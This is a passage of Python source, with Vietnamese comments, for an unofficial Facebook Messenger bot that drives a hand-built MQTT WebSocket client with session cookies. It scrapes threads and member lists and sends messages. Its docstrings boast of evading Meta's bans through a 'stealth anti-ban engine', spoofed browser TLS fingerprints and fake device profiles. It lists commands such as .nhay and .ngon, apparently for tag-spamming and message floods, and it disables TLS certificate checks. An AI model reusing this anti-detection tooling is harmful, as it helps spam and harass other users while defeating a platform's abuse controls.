            raise Exception(f"HTTP {r.status_code}:Code_{err_code}")

        if r.status_code not in (200, 201):
            raise Exception(f"HTTP {r.status_code}")

        resp_data = r.json()
        if isinstance(resp_data, dict) and resp_data.get("id"):
            register_system_sent_message(msg_id=resp_data["id"], text=formatted_content)
        return resp_data

# ĐỘNG CƠ FACEBOOK MESSENGER LIGHTSPEED MQTT (TÍCH HỢP TỪ CKIEN.ZIP)
MESSENGER_THEMES_CATALOG = [
    {"id": "3650637715209675", "name": "Besties"},
    {"id": "769656934577391", "name": "Women's History Month"},
    {"id": "702099018755409", "name": "Dune: Part Two"},
    {"id": "1480404512543552", "name": "Avatar: The Last Airbender"},
    {"id": "952656233130616", "name": "J.Lo"},
    {"id": "741311439775765", "name": "Love"},
    {"id": "215565958307259", "name": "Bob Marley: One Love"},
    {"id": "194982117007866", "name": "Football"},
    {"id": "1743641112805218", "name": "Soccer"},
    {"id": "730357905262632", "name": "Mean Girls"},
    {"id": "1270466356981452", "name": "Wonka"},
    {"id": "704702021720552", "name": "Pizza"},
    {"id": "1013083536414851", "name": "Wish"},
    {"id": "359537246600743", "name": "Trolls"},
    {"id": "173976782455615", "name": "The Marvels"},
    {"id": "2317258455139234", "name": "One Piece"},
    {"id": "6685081604943977", "name": "1989"},
    {"id": "1508524016651271", "name": "Avocado"},
    {"id": "265997946276694", "name": "Loki Season 2"},
    {"id": "6584393768293861", "name": "Olivia Rodrigo"},
    {"id": "845097890371902", "name": "Baseball"},
    {"id": "292955489929680", "name": "Lollipop"},
    {"id": "976389323536938", "name": "Loops"},
    {"id": "195296273246380", "name": "Bubble Tea"},
    {"id": "6026716157422736", "name": "Basketball"},
    {"id": "390127158985345", "name": "Chill"},
    {"id": "339021464972092", "name": "Music"},
    {"id": "1060619084701625", "name": "Lo-Fi"},
    {"id": "3190514984517598", "name": "Sky"},
    {"id": "627144732056021", "name": "Celebration"},
    {"id": "275041734441112", "name": "Care"},
    {"id": "3082966625307060", "name": "Astrology"},
    {"id": "539927563794799", "name": "Cottagecore"},
    {"id": "527564631955494", "name": "Ocean"},
    {"id": "230032715012014", "name": "Tie-Dye"},
    {"id": "788274591712841", "name": "Monochrome"},
    {"id": "3259963564026002", "name": "Default"},
    {"id": "724096885023603", "name": "Berry"},
    {"id": "624266884847972", "name": "Candy"},
    {"id": "273728810607574", "name": "Unicorn"},
    {"id": "262191918210707", "name": "Tropical"},
    {"id": "909695489504566", "name": "Sushi"},
    {"id": "582065306070020", "name": "Rocket"},
    {"id": "557344741607350", "name": "Citrus"},
    {"id": "271607034185782", "name": "Shadow"},
    {"id": "1257453361255152", "name": "Rose"},
    {"id": "571193503540759", "name": "Lavender"},
    {"id": "3273938616164733", "name": "Classic"},
    {"id": "403422283881973", "name": "Apple"},
    {"id": "3022526817824329", "name": "Peach"},
    {"id": "672058580051520", "name": "Honey"},
    {"id": "3151463484918004", "name": "Kiwi"},
    {"id": "193497045377796", "name": "Grape"},
]

def get_valid_mentions_ckien(text: str, mention):
    """Thuật toán tính vị trí offset & length cho mention_data MQTT (/ls_req) chuẩn 100% từ ckien.zip/module/nhaytagmqtt.py."""
    if not mention or not text:
        return []
    mentions = mention if isinstance(mention, list) else [mention]
    valid_mentions = []
    current_offset = 0
    for m in mentions:
        if not isinstance(m, dict):
            continue
        m_id = str(m.get("id") or m.get("uid") or "").strip()
        m_tag = str(m.get("tag") or m.get("name") or "").strip()
        if m_tag and not m_tag.startswith("@"):
            m_tag = "@" + m_tag
        if not m_id or not m_tag:
            continue
        provided_offset = m.get("offset")
        tag_len = 0
        if isinstance(provided_offset, int):
            if provided_offset >= len(text):
                break
            is_length_exceed = provided_offset + len(m_tag) > len(text)
            tag_len = len(m_tag) if not is_length_exceed else (len(text) - provided_offset)
            current_offset = provided_offset
        else:
            if current_offset >= len(text):
                break
            find = text.find(m_tag, current_offset)
            if find == -1:
                find = text.find(m_tag)
            if find != -1:
                is_length_exceed = find + len(m_tag) > len(text)
                tag_len = len(m_tag) if not is_length_exceed else (len(text) - find)
                current_offset = find
        if tag_len > 0:
            valid_mentions.append({
                "i": m_id,
                "o": current_offset,
                "l": tag_len,
                "t": m.get("type", "p"),
            })
            current_offset += tag_len
    return valid_mentions

class NativeWebSocketMQTTv31Client:
    """Client giao thức MQTT v3.1 (MQIsdp, Protocol Level 3) qua WebSockets thuần Python 100% (Không cần cài paho-mqtt):
    - Tương thích hoàn toàn với wss://edge-chat.facebook.com/chat?sid=...&cid=... của ckien.zip!
    - Đóng gói nhị phân chuẩn xác CONNECT (0x10), SUBSCRIBE (0x82), PUBLISH (0x32/0x30), PUBACK (0x40), PINGREQ (0xC0)."""

    def __init__(self, cookie_str, user_agent, username_json, on_connect_cb=None, on_message_cb=None, on_disconnect_cb=None):
        self.cookie_str = cookie_str
        self.user_agent = user_agent
        self.username_json = username_json
        self.on_connect_cb = on_connect_cb
        self.on_message_cb = on_message_cb
        self.on_disconnect_cb = on_disconnect_cb
        self.sock = None
        self.connected = False
        self.stop_ev = threading.Event()
        self.write_lock = threading.RLock()
        self.pkt_id_seq = 1
        self.reader_thread = None
        self.ping_thread = None

    @staticmethod
    def _encode_varint(length):
        out = bytearray()
        while True:
            byte = length % 128
            length //= 128
            if length > 0:
                byte |= 0x80
            out.append(byte)
            if length == 0:
                break
        return bytes(out)

    @staticmethod
    def _encode_utf8(s):
        b = str(s or "").encode("utf-8")
        return struct.pack(">H", len(b)) + b

    def _next_pkt_id(self):
        with self.write_lock:
            self.pkt_id_seq = (self.pkt_id_seq % 65000) + 1
            return self.pkt_id_seq

    def _send_ws_binary(self, payload_bytes, opcode=0x2):
        with self.write_lock:
            if not self.sock:
                raise Exception("MQTT WebSocket closed")
            ZaloRealtimeListener._send_ws_frame(self.sock, payload_bytes, opcode=opcode)

    def connect(self, ws_path, host="edge-chat.facebook.com", port=443, keepalive=12):
        self.stop_ev.clear()
        self.connected = False
        raw_sock = socket.create_connection((host, port), timeout=12)
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        self.sock = ctx.wrap_socket(raw_sock, server_hostname=host)

        ws_key = base64.b64encode(os.urandom(16)).decode("utf-8")
        handshake = (
            f"GET {ws_path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Upgrade: websocket\r\n"
            f"Connection: Upgrade\r\n"
            f"Origin: https://www.facebook.com\r\n"
            f"Referer: https://www.facebook.com/\r\n"
            f"User-Agent: {self.user_agent}\r\n"
            f"Cookie: {self.cookie_str}\r\n"
            f"Sec-WebSocket-Key: {ws_key}\r\n"
            f"Sec-WebSocket-Version: 13\r\n"
            f"Sec-WebSocket-Protocol: mqttv3.1, mqtt\r\n\r\n"
        )
        self.sock.sendall(handshake.encode("utf-8"))

        resp_buf = bytearray()
        while not resp_buf.endswith(b"\r\n\r\n"):
            b1 = self.sock.recv(1)
            if not b1:
                self.sock.close()
                raise Exception("Handshake closed by edge-chat.facebook.com")
            resp_buf.extend(b1)
            if len(resp_buf) > 8192:
                self.sock.close()
                raise Exception("Handshake header overflow")

        if b"101" not in resp_buf.split(b"\r\n")[0]:
            self.sock.close()
            raise Exception("WebSocket Upgrade rejected by edge-chat.facebook.com")

        # Gửi gói MQTT v3.1 CONNECT (Protocol Name = MQIsdp, Level = 3, Flags = 0x82 Username + CleanSession)
        var_hdr = b"\x00\x06MQIsdp\x03\x82" + struct.pack(">H", int(keepalive))
        pl = self._encode_utf8("mqttwsclient") + self._encode_utf8(self.username_json)
        connect_pkt = b"\x10" + self._encode_varint(len(var_hdr) + len(pl)) + var_hdr + pl
        self._send_ws_binary(connect_pkt, opcode=0x2)

        self.reader_thread = threading.Thread(target=self._reader_loop, daemon=True)
        self.reader_thread.start()
        self.ping_thread = threading.Thread(target=self._ping_loop, args=(keepalive,), daemon=True)
        self.ping_thread.start()

        t0 = time.time()
        while not self.connected and not self.stop_ev.is_set() and (time.time() - t0) < 10.0:
            time.sleep(0.08)
        return self.connected

    def subscribe(self, topic, qos=1):
        pkt_id = self._next_pkt_id()
        var_hdr = struct.pack(">H", pkt_id)
        pl = self._encode_utf8(topic) + bytes([int(qos) & 0x03])
        sub_pkt = b"\x82" + self._encode_varint(len(var_hdr) + len(pl)) + var_hdr + pl
        self._send_ws_binary(sub_pkt, opcode=0x2)

    def publish(self, topic, payload, qos=1, retain=False):
        t_bytes = self._encode_utf8(topic)
        p_bytes = payload.encode("utf-8") if isinstance(payload, str) else bytes(payload)
        first_byte = 0x30 | ((int(qos) & 0x03) << 1) | (0x01 if retain else 0x00)
        if qos > 0:
            pkt_id = self._next_pkt_id()
            var_hdr = t_bytes + struct.pack(">H", pkt_id)
        else:
            var_hdr = t_bytes
        pub_pkt = bytes([first_byte]) + self._encode_varint(len(var_hdr) + len(p_bytes)) + var_hdr + p_bytes
        self._send_ws_binary(pub_pkt, opcode=0x2)
        return True

    def _ping_loop(self, keepalive):
        interval = max(6.0, float(keepalive) * 0.85)
        while not self.stop_ev.is_set():
            self.stop_ev.wait(interval)
            if self.stop_ev.is_set():
                break
            if self.connected:
                try:
                    self._send_ws_binary(b"\xc0\x00", opcode=0x2)
                except Exception:
                    break

    def _parse_mqtt_stream(self, buf):
        idx = 0
        n = len(buf)
        while idx < n:
            first_b = buf[idx]
            pkt_type = (first_b & 0xF0) >> 4
            qos = (first_b >> 1) & 0x03
            idx += 1
            mult = 1
            rem_len = 0
            while idx < n:
                eb = buf[idx]
                idx += 1
                rem_len += (eb & 0x7F) * mult
                if (eb & 0x80) == 0:
                    break
                mult *= 128
            if idx + rem_len > n:
                break
            body = buf[idx:idx + rem_len]
            idx += rem_len

            if pkt_type == 2:  # CONNACK
                rc = body[1] if len(body) >= 2 else 0
                if rc == 0:
                    self.connected = True
                    if self.on_connect_cb:
                        try:
                            self.on_connect_cb(self, None, None, 0)
                        except Exception:
                            pass
                else:
                    self.stop_ev.set()
            elif pkt_type == 3:  # PUBLISH
                if len(body) >= 2:
                    t_len = struct.unpack(">H", body[:2])[0]
                    topic = body[2:2 + t_len].decode("utf-8", errors="ignore")
                    pos = 2 + t_len
                    if qos in (1, 2) and pos + 2 <= len(body):
                        pkt_id = struct.unpack(">H", body[pos:pos + 2])[0]
                        pos += 2
                        if qos == 1:
                            try:
                                self._send_ws_binary(b"\x40\x02" + struct.pack(">H", pkt_id), opcode=0x2)
                            except Exception:
                                pass
                    msg_payload = body[pos:]
                    if self.on_message_cb:
                        try:
                            class _MsgWrap:
                                pass
                            m_obj = _MsgWrap()
                            m_obj.topic = topic
                            m_obj.payload = msg_payload
                            self.on_message_cb(self, None, m_obj)
                        except Exception:
                            pass

    def _reader_loop(self):
        try:
            while not self.stop_ev.is_set() and self.sock:
                try:
                    self.sock.settimeout(3.0)
                    opcode, data = ZaloRealtimeListener._recv_full_ws_message(self.sock)
                    if opcode is None or opcode == 0x8:
                        break
                    if opcode in (0x1, 0x2) and data:
                        self._parse_mqtt_stream(data)
                except socket.timeout:
                    continue
                except Exception:
                    break
        finally:
            self.connected = False
            self.stop_ev.set()
            try:
                if self.sock:
                    self.sock.close()
            except Exception:
                pass
            if self.on_disconnect_cb:
                try:
                    self.on_disconnect_cb(self, None, -1)
                except Exception:
                    pass

    def disconnect(self):
        self.stop_ev.set()
        self.connected = False
        try:
            self._send_ws_binary(b"\xe0\x00", opcode=0x2)
        except Exception:
            pass
        try:
            if self.sock:
                self.sock.close()
        except Exception:
            pass

class MessengerClient:
    """Client Giao Thức Facebook Messenger Lightspeed MQTT (Tích hợp nguyên bản từ ckien.zip):
    - Kết nối trực tiếp tới wss://edge-chat.facebook.com/chat?sid={session_id}&cid={client_id} bằng giao thức MQTT v3.1.
    - Toàn bộ lệnh gửi tin nhắn, Tag tên (@Tag), Typing, Đổi nền Theme, Tạo Poll, Share Link, Share Contact đều đi qua
      topic '/ls_req' (app_id: '2220391788200892', label: '46', version_id: '7545284305482586', type: 3) — KHÔNG BỊ META BAN COOKIE!
    - Nhận lệnh .menu, .nhay, .ngon, .theme, .poll, .stop trực tiếp từ luồng '/t_ms' thời gian thực (< 0.1s) với 0 request HTTP Polling!"""

    _CLIENT_POOL = {}
    _THREADS_CACHE = {}
    _THREAD_TYPE_MAP = {}
    _POOL_LOCK = threading.RLock()

    @classmethod
    def get_pooled_client(cls, raw_cookies, uid="", force_new=False):
        c_dict = normalize_messenger_cookies(raw_cookies)
        u_id = extract_messenger_uid(c_dict, fallback_uid=uid)
        c_hash = hashlib.md5(json.dumps(c_dict, sort_keys=True).encode("utf-8")).hexdigest()[:12]
        pkey = f"{u_id}_{c_hash}"
        now = time.time()
        with cls._POOL_LOCK:
            if not force_new and pkey in cls._CLIENT_POOL:
                entry = cls._CLIENT_POOL[pkey]
                if now - entry["ts"] < 3600.0 and entry["client"].fb_dtsg:
                    return entry["client"]
        client = cls(c_dict, uid=u_id)
        with cls._POOL_LOCK:
            cls._CLIENT_POOL[pkey] = {"ts": now, "client": client}
        return client

    def __init__(self, cookies, uid=""):
        self.cookies_dict = normalize_messenger_cookies(cookies)
        self.uid = extract_messenger_uid(self.cookies_dict, fallback_uid=uid)
        if not self.uid:
            raise Exception("Cookie Messenger thiếu trường c_user!")
        if "xs" not in self.cookies_dict:
            raise Exception("Cookie Messenger thiếu trường xs!")

        self.cookie_str = "; ".join(f"{k}={v}" for k, v in self.cookies_dict.items())
        prof_m = MessengerStealthAntiBanEngine.get_deterministic_profile(self.uid)
        self.user_agent = prof_m["ua"]
        self.sec_ch_ua = prof_m["sec_ch_ua"]
        self.sec_platform = prof_m["platform"]
        self.last_mqtt_connect_attempt_ts = 0.0
        self.last_typing_sent_ts = 0.0

        self.s = requests.Session()
        tls_adapter = Chrome131TLSAdapter(pool_connections=128, pool_maxsize=256, max_retries=1)
        self.s.mount("https://", tls_adapter)
        self.s.mount("http://", HTTPAdapter(pool_connections=20, pool_maxsize=40, max_retries=1))
        self.s.headers.update(MessengerStealthAntiBanEngine.get_session_headers(self.uid, referer="https://www.facebook.com/"))
        self.s.cookies.update(self.cookies_dict)

        self.fb_dtsg = ""
        self.jazoest = ""
        self.lsd = ""
        self.client_rev = "1015919737"
        self.last_seq_id = None
        self.sync_token = None
        self.last_dtsg_fetch_ts = 0.0
        self.display_name = f"Mess_{self.uid[-4:]}"

        self.mqtt_client = None
        self.mqtt_connected = False
        self.mqtt_lock = threading.RLock()
        self.ws_req_number = 0
        self.ws_task_number = 0
        self.incoming_mqtt_msgs = deque(maxlen=500)
        self.mqtt_event_callbacks = []

        self._init_session_tokens()

    def register_incoming_callback(self, cb):
        if cb and cb not in self.mqtt_event_callbacks:
            self.mqtt_event_callbacks.append(cb)

    def _sync_rotated_cookies(self):
        try:
            jar_dict = self.s.cookies.get_dict()
            if jar_dict.get("c_user") and jar_dict.get("xs"):
                self.cookies_dict.update(jar_dict)
                self.cookie_str = "; ".join(f"{k}={v}" for k, v in self.cookies_dict.items())
                MessengerStealthAntiBanEngine.save_vault_state(
                    self.uid,
                    fb_dtsg=self.fb_dtsg,
                    jazoest=self.jazoest,
                    lsd=self.lsd,
                    cookies_dict=self.cookies_dict,
                    user_name=self.display_name,
                    last_seq_id=self.last_seq_id or "",
                    client_rev=self.client_rev,
                )
        except Exception:
            pass

    @staticmethod
    def _extract_dtsg_from_text(text):
        if not text:
            return ""
        patterns = [
            r'"DTSGInitialData"\s*,\s*\[\]\s*,\s*\{\s*"token"\s*:\s*"([^"\s]{12,})"',
            r'"DTSGInitData"\s*,\s*\[\]\s*,\s*\{\s*"token"\s*:\s*"([^"\s]{12,})"',
            r'\["DTSGInit(?:ial)?Data"\s*,\s*\[\]\s*,\s*\{\s*"token"\s*:\s*"([^"\s]{12,})"',
            r'name="fb_dtsg"\s+value="([^"\s]{12,})"',
            r'"fb_dtsg"\s*:\s*"([^"\s]{12,})"',
            r'"token"\s*:\s*"((?:NA|AQ)[A-Za-z0-9_\-]{8,}:[A-Za-z0-9_\-:]{8,})"',
        ]
        for pat in patterns:
            m = re.search(pat, text)
            if m and m.group(1):
                cand = m.group(1).strip()
                try:
                    if "\\u" in cand:
                        cand = cand.encode("utf-8").decode("unicode_escape")
                except Exception:
                    pass
                if len(cand) >= 12 and " " not in cand:
                    return cand
        return ""

    def _init_session_tokens(self, force_refresh=False):
        """Trích xuất fb_dtsg, jazoest, clientRevision chuẩn dataGetHome từ ckien.zip (Lưu cache 60 phút trong SQLite)."""
        now = time.time()
        if not force_refresh:
            cached = MessengerStealthAntiBanEngine.get_vault_state(self.uid)
            if cached and cached.get("fb_dtsg") and not str(cached["fb_dtsg"]).startswith("NAc_fallback"):
                self.fb_dtsg = cached["fb_dtsg"]
                self.jazoest = cached.get("jazoest") or MessengerStealthAntiBanEngine.compute_jazoest(self.fb_dtsg)
                self.lsd = cached.get("lsd") or ""
                self.last_seq_id = cached.get("last_seq_id") or None
                self.client_rev = cached.get("client_rev") or "1015919737"
                if cached.get("user_name"):
                    self.display_name = cached["user_name"]
                if cached.get("cookies"):
                    self.cookies_dict.update(cached["cookies"])
                    self.s.cookies.update(cached["cookies"])
                    self.cookie_str = "; ".join(f"{k}={v}" for k, v in self.cookies_dict.items())
                OWNER_UIDS_CACHE.add(self.uid)
                return True

        if force_refresh and (now - self.last_dtsg_fetch_ts < 120.0) and self.fb_dtsg:
            return True
        self.last_dtsg_fetch_ts = now

        nav_headers = {
            "Cookie": self.cookie_str,
            "User-Agent": self.user_agent,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9,vi;q=0.8",
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "none",
            "Sec-Fetch-User": "?1",
            "Upgrade-Insecure-Requests": "1",
        }

        pc_bound = FacebookPCDeviceGuard.bind_pc_profile_to_cookies(self.uid, self.cookies_dict)
        self.pc_name = pc_bound["pc_name"]
        self.user_agent = pc_bound["ua"]
        self.sec_ch_ua = pc_bound["sec_ch_ua"]
        self.sec_platform = pc_bound["platform"]
        self.cookies_dict.update(pc_bound["cookies"])
        self.s.cookies.update(self.cookies_dict)
        self.cookie_str = "; ".join(f"{k}={v}" for k, v in self.cookies_dict.items())
        nav_headers["Cookie"] = self.cookie_str
        nav_headers["User-Agent"] = self.user_agent
        nav_headers["Sec-Ch-Ua"] = self.sec_ch_ua
        nav_headers["Sec-Ch-Ua-Mobile"] = "?0"
        nav_headers["Sec-Ch-Ua-Platform"] = self.sec_platform

        # ANTI-HACK FACEBOOK: Chỉ kết nối bằng trình duyệt Máy Tính (www.facebook.com / www.messenger.com),
        # TUYỆT ĐỐI KHÔNG BAO GIỜ chạm vào mbasic.facebook.com làm nổ cờ báo 'Tài khoản bị hack'!
        for site in ("https://www.facebook.com/", "https://www.messenger.com/"):
            if self.fb_dtsg:
                break
            try:
                r = self.s.get(site, headers=nav_headers, timeout=10, allow_redirects=True)
                if "checkpoint" in r.url.lower():
                    raise Exception("Tài khoản Facebook đang vướng Checkpoint!")
                html = r.text or ""
                cand = self._extract_dtsg_from_text(html)
                if cand:
                    self.fb_dtsg = cand
                m_jaz = re.search(r"jazoest=(\d+)", html)
                if m_jaz:
                    self.jazoest = m_jaz.group(1).strip()
                m_rev = re.search(r'client_revision"\s*:\s*(\d+)', html)
                if m_rev:
                    self.client_rev = m_rev.group(1).strip()
                m_lsd = re.search(r'"LSD"\s*,\s*\[\]\s*,\s*\{\s*"token"\s*:\s*"([^"]+)"', html)
                if m_lsd:
                    self.lsd = m_lsd.group(1).strip()
                mn = re.search(r'"NAME"\s*:\s*"([^"]+)"', html)
                if mn and mn.group(1):
                    raw_n = mn.group(1).strip()
                    try:
                        if "\\u" in raw_n:
                            raw_n = raw_n.encode("utf-8").decode("unicode_escape")
                    except Exception:
                        pass
                    if raw_n and raw_n.lower() not in ("messenger", "facebook"):
                        self.display_name = raw_n[:45]
            except Exception as e:
                if "Checkpoint" in str(e):
                    raise e

        if not self.fb_dtsg:
            seed_h = hashlib.sha256(f"{self.uid}:{self.cookies_dict.get('xs')}".encode("utf-8")).hexdigest()[:24]
            self.fb_dtsg = f"NAc_fallback_{seed_h}:{int(time.time())}"

        if not self.jazoest:
            self.jazoest = MessengerStealthAntiBanEngine.compute_jazoest(self.fb_dtsg)
        OWNER_UIDS_CACHE.add(self.uid)
        GLOBAL_USER_NAME_CACHE[self.uid] = self.display_name
        self._sync_rotated_cookies()
        return True

    def _form_all(self, friendly_name=None, doc_id=None, require_graphql=0):
        data_form = {
            "fb_dtsg": self.fb_dtsg,
            "jazoest": self.jazoest,
            "__a": 1,
            "__user": str(self.uid),
            "__req": MessengerStealthAntiBanEngine.next_req_b36(),
            "__rev": self.client_rev,
            "av": str(self.uid),
        }
        if require_graphql is None:
            data_form["fb_api_caller_class"] = "RelayModern"
            data_form["fb_api_req_friendly_name"] = friendly_name
            data_form["server_timestamps"] = "true"
            data_form["doc_id"] = str(doc_id)
        return data_form

    def _parse_graphql_thread_nodes(self, raw_txt, threads_out, seen_tids, latest_msgs_out=None):
        if not raw_txt:
            return
        clean_txt = raw_txt.replace("for (;;);", "").replace("for(;;);", "").strip()
        for line in clean_txt.split("\n"):
            line = line.strip()
            if not line.startswith("{"):
                continue
            try:
                obj = json.loads(line)
                mt_root = (
                    ((obj.get("o0") or {}).get("data") or {}).get("viewer", {}).get("message_threads")
                    or (obj.get("data") or {}).get("viewer", {}).get("message_threads")
                    or {}
                )
                if mt_root.get("sync_sequence_id"):
                    self.last_seq_id = str(mt_root["sync_sequence_id"])

                nodes = mt_root.get("nodes") or []
                for nd in nodes:
                    if not isinstance(nd, dict):
                        continue
                    tk_obj = nd.get("thread_key") or {}
                    tid = str(tk_obj.get("thread_fbid") or tk_obj.get("other_user_id") or "").strip()
                    if not tid:
                        continue
                    is_grp = bool(tk_obj.get("thread_fbid")) or (nd.get("thread_type") in ("GROUP", "COMMUNITY_FOLDER"))
                    self._THREAD_TYPE_MAP[tid] = is_grp
                    t_name = (nd.get("name") or "").strip()

                    all_p = nd.get("all_participants") or {}
                    part_nodes = all_p.get("nodes") or [e.get("node") for e in (all_p.get("edges") or []) if isinstance(e, dict)]
                    mems = []
                    for pn in part_nodes:
                        actor = (pn.get("messaging_actor") if isinstance(pn, dict) else None) or {}
                        p_uid = str(actor.get("id") or "").strip()
                        p_name = (actor.get("name") or actor.get("short_name") or "").strip()
                        if p_uid and p_name:
                            GLOBAL_USER_NAME_CACHE[p_uid] = p_name
                            mems.append({"id": p_uid, "uid": p_uid, "name": p_name})

                    if mems:
                        with GROUP_CACHE_LOCK:
                            GROUP_MEMBERS_CACHE[f"mess_{tid}"] = {"ts": time.time(), "members": mems}

                    if not t_name:
                        other_names = [m["name"] for m in mems if m["uid"] != self.uid]
                        t_name = ", ".join(other_names[:4]) if other_names else f"Box Mess {tid[-5:]}"

                    if tid not in seen_tids:
                        seen_tids.add(tid)
                        prefix = "[Box Mess]" if is_grp else "[Chat Mess]"
                        threads_out.append({
                            "id": tid,
                            "name": f"{prefix} {t_name}",
                            "type": "messenger_thread",
                            "is_group": is_grp,
                            "members": len(mems) if mems else ("Nhóm" if is_grp else 2),
                        })

                    if latest_msgs_out is not None:
                        last_m_nodes = (nd.get("last_message") or {}).get("nodes") or []
                        for lm in last_m_nodes:
                            if not isinstance(lm, dict):
                                continue
                            mid = str(lm.get("message_id") or lm.get("offline_threading_id") or "")
                            txt_body = (
                                ((lm.get("message") or {}).get("text") if isinstance(lm.get("message"), dict) else None)
                                or lm.get("snippet")
                                or nd.get("snippet")
                                or ""
                            ).strip()
                            sender_uid = str(
                                ((lm.get("message_sender") or {}).get("messaging_actor") or {}).get("id")
                                or (lm.get("message_sender") or {}).get("id")
                                or self.uid
                            )
                            if txt_body:
                                latest_msgs_out.append({
                                    "thread_id": tid,
                                    "is_group": is_grp,
                                    "id": mid or f"{tid}_{txt_body[:25]}",
                                    "content": txt_body,
                                    "sender_id": sender_uid,
                                    "mentions": [],
                                })
            except Exception:
                continue

    def get_threads(self, use_cache=True, latest_msgs_out=None):
        """Lấy danh sách Box Messenger & đồng bộ sync_sequence_id (last_seq_id) chuẩn fbTools từ ckien.zip."""
        if use_cache and latest_msgs_out is None:
            with self._POOL_LOCK:
                c = self._THREADS_CACHE.get(self.uid)
                if c and (time.time() - c["ts"] < 300.0) and c.get("data"):
                    return list(c["data"])

        threads = []
        seen_tids = set()

        try:
            q_payload = self._form_all(require_graphql=0)
            q_payload["queries"] = MessengerStealthAntiBanEngine.json_minimal({
                "o0": {
                    "doc_id": "3336396659757871",
                    "query_params": {
                        "limit": 20,
                        "before": None,
                        "tags": ["INBOX"],
                        "includeDeliveryReceipts": False,
                        "includeSeqID": True
                    }
                }
            })
            hdrs = {
                "authority": "www.facebook.com",
                "accept": "*/*",
                "accept-language": "en-US,en;q=0.9,vi;q=0.8",
                "content-type": "application/x-www-form-urlencoded",
                "origin": "https://www.facebook.com",
                "referer": "https://www.facebook.com/",
                "sec-ch-ua": getattr(self, "sec_ch_ua", '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"'),
                "sec-ch-ua-mobile": "?0",
                "sec-ch-ua-platform": getattr(self, "sec_platform", '"Windows"'),
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
                "user-agent": self.user_agent,
                "x-fb-friendly-name": "CometChatInboxQuery",
            }
            r = self.s.post("https://www.facebook.com/api/graphqlbatch/", data=q_payload, headers=hdrs, timeout=12)
            if r.status_code == 200 and r.text:
                self._parse_graphql_thread_nodes(r.text, threads, seen_tids, latest_msgs_out=latest_msgs_out)
                self._sync_rotated_cookies()
        except Exception:
            pass

        if threads:
            with self._POOL_LOCK:
                self._THREADS_CACHE[self.uid] = {"ts": time.time(), "data": list(threads)}
        return threads

    def get_thread_members(self, thread_id, use_cache=True):
        """Lấy toàn bộ danh sách thành viên trong Box Messenger bằng doc_id 3449967031715030 (từ ckien.zip/module/username.py)."""
        tid_s = str(thread_id).strip()
        cache_k = f"mess_{tid_s}"
        if use_cache:
            with GROUP_CACHE_LOCK:
                c = GROUP_MEMBERS_CACHE.get(cache_k)
                if c and (time.time() - c["ts"] < 300.0) and c.get("members"):
                    return list(c["members"])

        try:
            form_q = {
                "o0": {
                    "doc_id": "3449967031715030",
                    "query_params": {
                        "id": tid_s,
                        "message_limit": 0,
                        "load_messages": False,
                        "load_read_receipts": False,
                        "before": None
                    }
                }
            }
            submit_data = {
                "queries": json.dumps(form_q),
                "batch_name": "MessengerGraphQLThreadFetcher",
                "fb_dtsg": self.fb_dtsg,
                "jazoest": self.jazoest,
            }
            hdrs = MessengerStealthAntiBanEngine.get_session_headers(self.uid, referer="https://www.facebook.com/")
            r = self.s.post("https://www.facebook.com/api/graphqlbatch/", data=submit_data, headers=hdrs, timeout=12)
            if r.status_code == 200 and r.text:
                clean_t = r.text.replace("for (;;);", "").replace("for(;;);", "").strip()
                mems = []
                for line in clean_t.split("\n"):
                    line = line.strip()
                    if not line.startswith("{") or line.startswith('{"batch_name"'):
                        continue
                    try:
                        d_obj = json.loads(line)
                        mt = ((d_obj.get("o0") or {}).get("data") or {}).get("message_thread") or {}
                        edges = (mt.get("all_participants") or {}).get("edges") or []
                        for ed in edges:
                            actor = ((ed.get("node") if isinstance(ed, dict) else None) or {}).get("messaging_actor") or {}
                            p_uid = str(actor.get("id") or "").strip()
                            p_name = str(actor.get("name") or actor.get("short_name") or "").strip()
                            if p_uid and p_name:
                                GLOBAL_USER_NAME_CACHE[p_uid] = p_name
                                mems.append({"id": p_uid, "uid": p_uid, "name": p_name})
                    except Exception:
                        continue
                if mems:
                    with GROUP_CACHE_LOCK:
                        GROUP_MEMBERS_CACHE[cache_k] = {"ts": time.time(), "members": mems}
                    return mems
        except Exception:
            pass

        try:
            self.get_threads(use_cache=False)
            with GROUP_CACHE_LOCK:
                c = GROUP_MEMBERS_CACHE.get(cache_k)
                if c and c.get("members"):
                    return list(c["members"])
        except Exception:
            pass
        return []

    # KẾT NỐI & ĐỒNG BỘ GIAO THỨC MQTT LIGHTSPEED (/ls_req & /t_ms TỪ CKIEN.ZIP)
    def _on_mqtt_connect(self, client, userdata, flags, rc):
        if rc == 0:
            self.mqtt_connected = True
            topics = [
                "/ls_resp",
                "/thread_typing",
                "/orca_typing_notifications",
                "/t_ms",
                "/mercury",
                "/messaging_events",
            ]
            for tp in topics:
                client.subscribe(tp, qos=1)

            client.publish(
                topic="/ls_app_settings",
                payload=MessengerStealthAntiBanEngine.json_minimal({
                    "ls_fdid": "",
                    "ls_sv": "6928813347213944"
                }),
                qos=1,
                retain=False,
            )

            queue_pl = {
                "sync_api_version": 10,
                "max_deltas_able_to_process": 1000,
                "delta_batch_size": 500,
                "encoding": "JSON",
                "entity_fbid": str(self.uid),
            }
            if self.sync_token:
                tp_sync = "/messenger_sync_get_diffs"
                queue_pl["last_seq_id"] = self.last_seq_id or "1"
                queue_pl["sync_token"] = self.sync_token
            else:
                tp_sync = "/messenger_sync_create_queue"
                queue_pl["initial_titan_sequence_id"] = self.last_seq_id or "1"
                queue_pl["device_params"] = None

            client.publish(
                topic=tp_sync,
                payload=MessengerStealthAntiBanEngine.json_minimal(queue_pl),
                qos=1,
                retain=False,
            )
        else:
            self.mqtt_connected = False

    def _on_mqtt_disconnect(self, client, userdata, rc):
        self.mqtt_connected = False

    @staticmethod
    def _decode_mqtt_payload_str(raw_bytes):
        if not raw_bytes:
            return ""
        if isinstance(raw_bytes, str):
            s = raw_bytes.strip()
            idx_b = s.find("{")
            return s[idx_b:] if idx_b != -1 else ""
        b = bytes(raw_bytes)
